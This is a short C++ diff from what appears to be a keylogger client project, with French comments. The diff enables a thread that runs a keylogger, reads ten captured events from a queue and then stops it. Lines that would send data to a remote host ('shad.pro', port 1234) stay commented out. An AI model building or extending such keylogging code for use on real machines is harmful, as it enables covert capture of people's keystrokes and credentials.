@@ -1,4 +1,5 @@
 #include <iostream>
+#include <thread>
 #include "client.h"
 #include "sayHello.h"
 #include "IInfoClient.h"
@@ -65,7 +66,17 @@ int		clientController::mainAction(int ac, char **av) {
 	// this->netinstance->init("shad.pro", 1234);
 	// this->netinstance->auth(ifinstance->routine());
 	// this->dhinstance->setNetQueue(this->netinstance->getQueue());
-	//std::thread keylogging(klinstance->run());
+	std::thread keylogging(klinstance->run());
+	int i = 0;
+	while (this->_lwqueue.getUsage() == true) {
+		void *event = this->_lwqueue.pop_elem(); //Ici le programme bloque dans ce thread 
+		std::cout << "Event addr: " << event << std::endl;
+		i++;
+		if (i > 10) //Pour compter 10 events
+			this->_lwqueue.setUsage(false);
+	}
+	keylogging.join(); //Le keylogger a vu que la msgQueue était set a false, il arrête son comportement
+	std::cout << "Fin du keylogg" << std::endl;
 	//std::thread datahandling(dhinstance->routine());
 	//std::thread networking(netinstance->routine(_lqueue));
 	// keylog.join();
